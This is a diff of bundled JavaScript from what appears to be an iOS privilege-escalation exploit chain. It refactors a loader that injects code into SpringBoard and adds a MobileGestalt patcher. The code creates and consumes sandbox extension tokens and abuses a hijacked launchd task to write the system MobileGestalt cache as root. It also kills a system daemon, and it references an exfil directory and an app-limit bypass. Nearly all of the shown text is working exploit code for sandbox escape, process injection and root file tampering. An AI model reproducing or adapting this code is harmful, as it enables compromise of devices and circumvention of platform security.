 		launchdTask.destroy();
 		return false;
 	}
-	let springBoardAgentLoader = null;
-	let springBoardAgentTask = null;
-	let agentPid = 0;
 	try {
 
+	phaseStart("Sandbox setup");
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
+	phaseEnd("Sandbox setup");
+	phaseStart("Chain status log");
 	chainStatusInitLog();
-	let chainSyslogOk = chainSyslogInitDownloads();
-
-	LOG("[PE] Status log: " + CHAIN_STATUS_LOG_PATH);
-	if (ENABLE_CHAIN_SYSLOG_EXPORT) {
-		LOG("[PE] Chain syslog export path: " + chainSyslogPath + " ready=" + chainSyslogOk);
-	} else {
-		LOG("[PE] Chain syslog export disabled");
-	}
-	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
-	if (ENABLE_SAFARI_KILL_AFTER_CLEAN && safariCleanOk) {
-		runOptionalStage("Safari app termination after cleanup", true, () => terminateSafariAfterClean(launchdTask));
-	} else if (ENABLE_SAFARI_KILL_AFTER_CLEAN) {
-		LOG("[PE] Safari app termination after cleanup skipped cleanOk=" + safariCleanOk);
-	} else {
-		LOG("[PE] Safari app termination after cleanup disabled");
-	}
-	LOG("[PE] Initial Safari clean complete cleanOk=" + safariCleanOk + "; URL launch disabled");
+	phaseEnd("Chain status log");
 
 	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
+	phaseStart("Media dir prep");
 	let filzaDst = "/private/var/mobile/Media/Downloads/";
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
+	LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
+	phaseEnd("Media dir prep");
 
-	let needsSpringBoardAgent = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK;
-	if (needsSpringBoardAgent) {
+	phaseStart("Safari clean+kill");
+	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
+	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
+		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
+	}
+	phaseEnd("Safari clean+kill");
+
+
+	let agentPid = 0;
+	if (ENABLE_SPRINGBOARD_AGENT) {
+		let agentLoader = null;
 		try {
-			LOG("[PE] SpringBoard agent required: coruna=" + ENABLE_CORUNA_TWEAKLOADER + " js=" + ENABLE_SPRINGBOARD_JS_TWEAK);
+			LOG("[PE] SpringBoard agent required: coruna=" + ENABLE_CORUNA_TWEAKLOADER + " js=" + ENABLE_SPRINGBOARD_JS_TWEAK + " overlay=" + ENABLE_CHAIN_STATUS_OVERLAY);
 			LOG("[PE] Creating agent loader for " + targetProcess);
-			springBoardAgentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
+			agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
 			LOG("[PE] Agent loader created, calling inject()...");
-			let agentInjected = springBoardAgentLoader.inject();
+			let agentInjected = agentLoader.inject();
 			LOG("[PE] Agent loader inject result: " + agentInjected);
 			if (agentInjected) {
 				LOG("[+] Agent loader injected");
-				springBoardAgentTask = springBoardAgentLoader.task;
-				agentPid = springBoardAgentTask.pid();
+				agentPid = agentLoader.task.pid();
 				LOG("[PE] Agent loader pid=" + agentPid + "; applying sandbox tokens");
-				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(springBoardAgentTask);
+				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
 				LOG("[PE] Agent loader tokens applied; adjusting memory pressure");
 				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
+				if (ENABLE_CHAIN_STATUS_OVERLAY)
+					injectChainStatusOverlay(agentLoader.task, migFilterBypass, agentPid);
+				else
+					LOG("[PE] Chain status overlay disabled");
 				if (ENABLE_CORUNA_TWEAKLOADER)
-					injectCorunaTweakloader(springBoardAgentTask, migFilterBypass, agentPid);
+					injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
 				else
 					LOG("[PE] Coruna tweakloader disabled");
 				let springboardTweakInjected = false;
-				if (ENABLE_SPRINGBOARD_JS_TWEAK) {
-					springboardTweakInjected = injectLightweightSpringBoardPayload(springBoardAgentTask, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
-				} else {
+				if (ENABLE_SPRINGBOARD_JS_TWEAK)
+					springboardTweakInjected = injectLightweightSpringBoardPayload(agentLoader.task, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
+				else
 					LOG("[PE] SpringBoard JS tweak disabled");
-				}
 				if (springboardTweakInjected && !ENABLE_POWERCUFF_TWEAK && SBCUST_ONLY_SETTLE_DELAY_USEC > 0n) {
 					LOG("[PE] SpringBoard-only mode: waiting " + SBCUST_ONLY_SETTLE_DELAY_USEC.toString() + " usec for async main-thread dispatch to settle");
 					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
@@ -9964,16 +9876,25 @@ function start() { LOG("[+] PE start() called");
 		} catch (agentErr) {
 			LOG("[PE] Agent loader exception: " + String(agentErr));
 			LOG("[PE] Agent loader stack: " + (agentErr.stack || "no stack"));
+		} finally {
+			if (agentLoader) {
+				LOG("[PE] Destroying agent loader");
+				try {
+					agentLoader.destroy();
+					LOG("[PE] Agent loader destroyed");
+				} catch (destroyErr) {
+					LOG("[PE] Agent loader destroy exception: " + String(destroyErr));
+				}
+			}
 		}
 	} else {
 		LOG("[PE] SpringBoard agent loader skipped (no SpringBoard payload enabled)");
 	}
 
-		if (ENABLE_POWERCUFF_TWEAK) {
+		if (ENABLE_POWERCUFF_TWEAK)
 			injectThermalmonitordPayload(migFilterBypass, POWERCUFF_TWEAK_PATH, POWERCUFF_TWEAK_LABEL);
-		} else {
+		else
 			LOG("[PE] Powercuff tweak disabled");
-		}
 
 	runOptionalStage("Unrelated dumps master switch", ENABLE_UNRELATED_DUMPS, () => true);
 
@@ -10145,9 +10066,302 @@ function start() { LOG("[+] PE start() called");
 		}
 		return true;
 	});
+	// ========== MobileGestalt In-Place Patcher ==========
+	LOG("[MG] ENABLE_MGPATCHER = " + ENABLE_MGPATCHER);
+	if (ENABLE_MGPATCHER) {
+		LOG("[MG] === MG PATCHER ENTRY (in-place) ===");
+		try {
+			const MGNative = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+			const GESTALT_PATH = "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
+
+			// Issue + consume sandbox tokens. sandbox_extension_consume returns
+			// a handle >= 0 on success, -1 on failure. Log the result so we can
+			// tell if the token was actually accepted by the kernel.
+			LOG("[MG] Issuing sandbox tokens...");
+			let tok1 = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath(GESTALT_PATH, false);
+			LOG("[MG] token for plist: " + (tok1 ? tok1.substring(0, 60) + "..." : "FAILED (null)"));
+			if (tok1) {
+				MGNative.writeString(MGNative.mem, tok1);
+				let consumeRet1 = MGNative.callSymbol("sandbox_extension_consume", MGNative.mem);
+				LOG("[MG] consume(plist) = " + consumeRet1 + (consumeRet1 >= 0 ? " (OK)" : " (FAILED)"));
+			}
+			let tok2 = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/", false);
+			LOG("[MG] token for dir: " + (tok2 ? tok2.substring(0, 60) + "..." : "FAILED (null)"));
+			if (tok2) {
+				MGNative.writeString(MGNative.mem, tok2);
+				let consumeRet2 = MGNative.callSymbol("sandbox_extension_consume", MGNative.mem);
+				LOG("[MG] consume(dir) = " + consumeRet2 + (consumeRet2 >= 0 ? " (OK)" : " (FAILED)"));
+			}
+
+			// Also consume tokens for /private/var variant (iOS resolves symlinks)
+			let tok3 = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private" + GESTALT_PATH, false);
+			if (tok3) {
+				MGNative.writeString(MGNative.mem, tok3);
+				let consumeRet3 = MGNative.callSymbol("sandbox_extension_consume", MGNative.mem);
+				LOG("[MG] consume(/private plist) = " + consumeRet3 + (consumeRet3 >= 0 ? " (OK)" : " (FAILED)"));
+			}
+
+			// Check errno helper
+			function mgErrno() { return MGNative.callSymbol("__error"); }
+			function mgGetErrno() {
+				let ep = mgErrno();
+				if (!ep) return "?";
+				let buf = MGNative.read(ep, 4);
+				return new DataView(buf).getInt32(0, true);
+			}
+
+			// 1. Read the existing plist file
+			LOG("[MG] Opening " + GESTALT_PATH + " for read...");
+			let fd = MGNative.callSymbol("open", GESTALT_PATH, 0n); // O_RDONLY
+			LOG("[MG] open(RDONLY) fd = " + fd + " errno=" + mgGetErrno());
+			if (!fd || Number(fd) < 0) throw "cannot open for read fd=" + fd + " errno=" + mgGetErrno();
+
+			// Get file size via lseek
+			let fileSize = Number(MGNative.callSymbol("lseek", fd, 0n, 2n)); // SEEK_END
+			LOG("[MG] file size = " + fileSize);
+			if (fileSize <= 0 || fileSize > 4 * 1024 * 1024) {
+				MGNative.callSymbol("close", fd);
+				throw "unexpected file size: " + fileSize;
+			}
+			MGNative.callSymbol("lseek", fd, 0n, 0n); // SEEK_SET
+
+			let fileBuf = MGNative.callSymbol("malloc", BigInt(fileSize + 16));
+			let bytesRead = Number(MGNative.callSymbol("read", fd, fileBuf, BigInt(fileSize)));
+			MGNative.callSymbol("close", fd);
+			LOG("[MG] read " + bytesRead + "/" + fileSize + " bytes");
+			if (bytesRead !== fileSize) {
+				MGNative.callSymbol("free", fileBuf);
+				throw "short read: " + bytesRead + "/" + fileSize;
+			}
+
+			// 2. Parse binary plist via CFPropertyList
+			LOG("[MG] Parsing plist with CFPropertyList...");
+			let cfData = MGNative.callSymbol("CFDataCreate", 0n, fileBuf, BigInt(fileSize));
+			MGNative.callSymbol("free", fileBuf);
+			if (!cfData) throw "CFDataCreate failed";
+
+			let errorPtr = MGNative.callSymbol("calloc", 1n, 8n);
+			// kCFPropertyListMutableContainersAndLeaves = 0x2
+			let plist = MGNative.callSymbol("CFPropertyListCreateWithData", 0n, cfData, 0x2n, 0n, errorPtr);
+			LOG("[MG] plist = 0x" + BigInt.asUintN(64, BigInt(plist)).toString(16));
+			MGNative.callSymbol("CFRelease", cfData);
+			if (!plist) {
+				MGNative.callSymbol("free", errorPtr);
+				throw "CFPropertyListCreateWithData failed";
+			}
+
+			// 3. Get CacheExtra dictionary
+			let cacheExtraKey = MGNative.callSymbol("CFStringCreateWithCString", 0n, "CacheExtra", 0x08000100n);
+			let cacheExtra = MGNative.callSymbol("CFDictionaryGetValue", plist, cacheExtraKey);
+			LOG("[MG] CacheExtra = 0x" + BigInt.asUintN(64, BigInt(cacheExtra)).toString(16));
+			MGNative.callSymbol("CFRelease", cacheExtraKey);
+			if (!cacheExtra) {
+				MGNative.callSymbol("CFRelease", plist);
+				MGNative.callSymbol("free", errorPtr);
+				throw "CacheExtra key not found in plist";
+			}
+
+			// MobileGestalt key map: flag name -> [key(s), value]
+			// Multi-key entries (AOD, shutter, etc.) set multiple CacheExtra keys
+			let MG_KEY_MAP = {
+				bootchime:      [["QHxt+hGLaBPbQJbXiUJX3w"], 1],
+				chargelimit:    [["37NVydb//GP/GrhuTN+exg"], 1],
+				taptowake:      [["yZf3GTRMGTuwSV/lD7Cagw"], 1],
+				collisionsos:   [["HCzWusHQwZDea6nNhaKndw"], 1],
+				pencil:         [["yhHcB0iH0d1XzPO/CFd3ow"], 1],
+				actionbutton:   [["cT44WE1EohiwRzhsZ8xEsw"], 1],
+				aod:            [["2OOJf1VhaM7NxfRok3HbWQ", "j8/Omm6s1lsmTDFsXjsBfA"], 1],
+				stagemanager:   [["qeaj75wk3HF4DwQ8qbIi7g"], 1],
+				internalinstall:[["EqrsVvjcYDdxHBiQmGhAWw", "LBJfwOEzExRxzlAnSuI7eg"], 1],
+				srd:            [["XYlJKKkj2hztRP1NWWnhlw"], 1],
+				shutter:        [["h63QSdBCiT/z0WU6rdQv6Q", "zHeENZu+wbg7PUprwNwBWg"], "str"],
+				ipadapps:       [["9MZ5AdH43csAUajl/dU+IQ"], "arr"]
+			};
+			// Shutter sets string values: region=US, suffix=LL/A
+			let SHUTTER_VALS = {"h63QSdBCiT/z0WU6rdQv6Q": "US", "zHeENZu+wbg7PUprwNwBWg": "LL/A"};
+
+			let enableFlags = MG_FLAGS.split(',').filter(function(f) { return f.length > 0; });
+			LOG("[MG] enable=" + (enableFlags.length > 0 ? enableFlags.join(',') : '(none)'));
+
+			let mgModified = false;
+
+			// 4a. Full reset: remove every patchable key from CacheExtra.
+			// We can't track which subset was previously patched, so strip
+			// all of them. MobileGestalt re-queries from real hardware.
+			// (Truncating the plist doesn't work live -- the MG daemon has
+			// the cache in memory and rewrites it on shutdown.)
+			if (enableFlags.length === 0) {
+				LOG("[MG] No flags enabled -- removing all patchable keys from CacheExtra");
+				let allFlagNames = Object.keys(MG_KEY_MAP);
+				let removed = 0;
+				for (let ri = 0; ri < allFlagNames.length; ri++) {
+					let rkeys = MG_KEY_MAP[allFlagNames[ri]][0];
+					for (let rki = 0; rki < rkeys.length; rki++) {
+						let cfRK = MGNative.callSymbol("CFStringCreateWithCString", 0n, rkeys[rki], 0x08000100n);
+						if (MGNative.callSymbol("CFDictionaryContainsKey", cacheExtra, cfRK)) {
+							MGNative.callSymbol("CFDictionaryRemoveValue", cacheExtra, cfRK);
+							LOG("[MG] REMOVE " + rkeys[rki]);
+							removed++;
+						}
+						MGNative.callSymbol("CFRelease", cfRK);
+					}
+				}
+				if (removed > 0) mgModified = true;
+				LOG("[MG] removed " + removed + " keys from CacheExtra");
+			}
+
+			// 4b. Selective patch: set only the checked keys in CacheExtra,
+			// leave everything else in the plist untouched.
+			if (enableFlags.length > 0) {
+				let valBuf = MGNative.callSymbol("calloc", 1n, 8n);
+				let oneBytes = new ArrayBuffer(8);
+				new DataView(oneBytes).setBigInt64(0, 1n, true);
+				MGNative.write(valBuf, oneBytes);
+				let cfOne = MGNative.callSymbol("CFNumberCreate", 0n, 4n, valBuf);
+				MGNative.callSymbol("free", valBuf);
+
+				for (let fi = 0; fi < enableFlags.length; fi++) {
+					let entry = MG_KEY_MAP[enableFlags[fi]];
+					if (!entry) { LOG("[MG] unknown flag: " + enableFlags[fi]); continue; }
+					let keys = entry[0];
+					for (let ki = 0; ki < keys.length; ki++) {
+						let mgKey = keys[ki];
+						let cfKey = MGNative.callSymbol("CFStringCreateWithCString", 0n, mgKey, 0x08000100n);
+						if (SHUTTER_VALS[mgKey]) {
+							let cfVal = MGNative.callSymbol("CFStringCreateWithCString", 0n, SHUTTER_VALS[mgKey], 0x08000100n);
+							MGNative.callSymbol("CFDictionarySetValue", cacheExtra, cfKey, cfVal);
+							LOG("[MG] SET " + mgKey + " = \"" + SHUTTER_VALS[mgKey] + "\"");
+							mgModified = true;
+							MGNative.callSymbol("CFRelease", cfVal);
+						} else if (mgKey === "9MZ5AdH43csAUajl/dU+IQ") {
+							let arr = MGNative.callSymbol("CFArrayCreateMutable", 0n, 2n, 0n);
+							let v1Buf = MGNative.callSymbol("calloc", 1n, 8n);
+							let v2Buf = MGNative.callSymbol("calloc", 1n, 8n);
+							let b1 = new ArrayBuffer(8); new DataView(b1).setBigInt64(0, 1n, true);
+							let b2 = new ArrayBuffer(8); new DataView(b2).setBigInt64(0, 2n, true);
+							MGNative.write(v1Buf, b1); MGNative.write(v2Buf, b2);
+							let n1 = MGNative.callSymbol("CFNumberCreate", 0n, 4n, v1Buf);
+							let n2 = MGNative.callSymbol("CFNumberCreate", 0n, 4n, v2Buf);
+							MGNative.callSymbol("CFArrayAppendValue", arr, n1);
+							MGNative.callSymbol("CFArrayAppendValue", arr, n2);
+							MGNative.callSymbol("CFDictionarySetValue", cacheExtra, cfKey, arr);
+							LOG("[MG] SET " + mgKey + " = [1, 2]");
+							mgModified = true;
+							MGNative.callSymbol("CFRelease", n1); MGNative.callSymbol("CFRelease", n2);
+							MGNative.callSymbol("free", v1Buf); MGNative.callSymbol("free", v2Buf);
+							MGNative.callSymbol("CFRelease", arr);
+						} else {
+							MGNative.callSymbol("CFDictionarySetValue", cacheExtra, cfKey, cfOne);
+							LOG("[MG] SET " + mgKey + " = 1");
+							mgModified = true;
+						}
+						MGNative.callSymbol("CFRelease", cfKey);
+					}
+				}
+				if (cfOne) MGNative.callSymbol("CFRelease", cfOne);
+			}
+
+			// 5. Kill MobileGestaltHelper so it can't rewrite the cache
+			// while we're writing. launchd will respawn it after we're
+			// done, and it'll read our modified plist fresh.
+			if (mgModified) {
+				try {
+					let mgHelperName = "MobileGestalt";  // p_comm is truncated to 16 chars
+					let mgTask = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(mgHelperName);
+					if (mgTask) {
+						let mgProc = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskProc(mgTask);
+						let mgPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(mgProc + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().pid);
+						LOG("[MG] Found MobileGestaltHelper pid=" + mgPid + ", killing");
+						let killRet = launchdTask.call(10, "kill", BigInt(mgPid), 9n);
+						LOG("[MG] kill(" + mgPid + ", 9) = " + killRet);
+						MGNative.callSymbol("usleep", 100000n);
+					} else {
+						LOG("[MG] MobileGestaltHelper not found in task list, skipping kill");
+					}
+				} catch (killErr) {
+					LOG("[MG] kill MobileGestaltHelper failed: " + String(killErr));
+				}
+			}
+
+			// 6. Write back if anything changed -- via launchdTask (root,
+			// unsandboxed).
+			if (!mgModified) {
+				LOG("[MG] no changes made, skipping plist write");
+				MGNative.callSymbol("CFRelease", plist);
+				MGNative.callSymbol("free", errorPtr);
+			} else {
+				// kCFPropertyListBinaryFormat_v1_0 = 200
+				let outData = MGNative.callSymbol("CFPropertyListCreateData", 0n, plist, 200n, 0n, errorPtr);
+				MGNative.callSymbol("CFRelease", plist);
+				MGNative.callSymbol("free", errorPtr);
+				if (!outData) throw "CFPropertyListCreateData failed";
+
+				let outPtr = MGNative.callSymbol("CFDataGetBytePtr", outData);
+				let outLen = Number(MGNative.callSymbol("CFDataGetLength", outData));
+				LOG("[MG] serialized: " + outLen + " bytes (original was " + fileSize + ")");
+
+				// Allocate a buffer in launchd for the plist data
+				let remoteBuf = launchdTask.call(10, "malloc", BigInt(outLen + 16));
+				LOG("[MG] launchd malloc(" + outLen + ") = 0x" + BigInt.asUintN(64, BigInt(remoteBuf)).toString(16));
+				if (!remoteBuf) {
+					MGNative.callSymbol("CFRelease", outData);
+					throw "launchd malloc failed for plist data";
+				}
+
+				// Copy serialized plist from our process into launchd's memory
+				launchdTask.write(remoteBuf, outPtr, outLen);
+				LOG("[MG] copied " + outLen + " bytes to launchd");
+				MGNative.callSymbol("CFRelease", outData);
+
+				// Write the path string into launchd's trojanMem
+				let mgMem = launchdTask.mem();
+				launchdTask.writeStr(mgMem, GESTALT_PATH);
+
+				// Open, write, fsync, close -- all via launchd (root context)
+				// O_WRONLY | O_TRUNC = 0x0201
+				let fdOut = launchdTask.call(10, "open", mgMem, 0x0201n, 0o644n);
+				LOG("[MG] launchd open(WR|TRUNC) fd=" + fdOut);
+				if (!fdOut || Number(fdOut) < 0) {
+					launchdTask.call(10, "free", remoteBuf);
+					throw "launchd cannot open for write fd=" + fdOut;
+				}
+
+				let totalWritten = 0;
+				while (totalWritten < outLen) {
+					let chunk = Math.min(outLen - totalWritten, 32768);
+					let w = Number(launchdTask.call(10, "write", fdOut, remoteBuf + BigInt(totalWritten), BigInt(chunk)));
+					if (w <= 0) {
+						LOG("[MG] launchd write() returned " + w + " at offset " + totalWritten);
+						break;
+					}
+					totalWritten += w;
+				}
+				let fsyncRet = launchdTask.call(10, "fsync", fdOut);
+				LOG("[MG] launchd fsync=" + fsyncRet);
+				launchdTask.call(10, "close", fdOut);
+				launchdTask.call(10, "free", remoteBuf);
+				LOG("[MG] launchd wrote " + totalWritten + "/" + outLen + " bytes");
+
+				// VERIFY: re-read via launchd to confirm write persisted
+				LOG("[MG] === VERIFICATION ===");
+				let vfdOut = launchdTask.call(10, "open", mgMem, 0n); // O_RDONLY
+				if (vfdOut && Number(vfdOut) >= 0) {
+					let vsize = Number(launchdTask.call(10, "lseek", vfdOut, 0n, 2n));
+					LOG("[MG] verify file size=" + vsize + " (wrote " + totalWritten + ")");
+					launchdTask.call(10, "close", vfdOut);
+				}
+			}
+
+		} catch (mgErr) {
+			LOG("[MG] ERROR: " + String(mgErr));
+		}
+		LOG("[MG] === MG PATCHER EXIT ===");
+	} else {
+		LOG("[MG] MobileGestalt patcher disabled");
+	}
 	// ========== 3-App Limit Bypass (APFS own + direct removexattr) ==========
-	LOG("[THREEAPP] ENABLE_THREEAPP = " + ENABLE_THREEAPP);
-	if (ENABLE_THREEAPP) {
+	LOG("[THREEAPP] ENABLE_APPLIMIT = " + ENABLE_APPLIMIT + " requested=" + ENABLE_APPLIMIT_REQUESTED);
+	if (ENABLE_APPLIMIT) {
 		LOG("[THREEAPP] === APP LIMIT BYPASS ENTRY ===");
 		try {
 			const ALNative = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
@@ -10578,28 +10792,11 @@ function start() { LOG("[+] PE start() called");
 	} else {
 		LOG("[THREEAPP] 3-App Bypass disabled");
 	}
-
-	LOG("[PE] start() completed successfully");
-	LOG("[PE] Done page launch disabled");
-	if (ENABLE_CHAIN_SYSLOG_EXPORT) {
-		LOG("[PE] Chain syslog exported to: " + chainSyslogPath);
-		chainSyslogSync();
-	} else {
-		LOG("[PE] Chain syslog export disabled");
-	}
 	} finally {
-		if (springBoardAgentLoader) {
-			LOG("[PE] Destroying agent loader");
-			try {
-				springBoardAgentLoader.destroy();
-				LOG("[PE] Agent loader destroyed");
-			} catch (destroyErr) {
-				LOG("[PE] Agent loader destroy exception: " + String(destroyErr));
-			}
-		}
 		LOG("[PE] Cleaning up launchdTask...");
 		launchdTask.destroy();
 	}
+	LOG("[PE] start() completed successfully");
 
 	return true;
 }
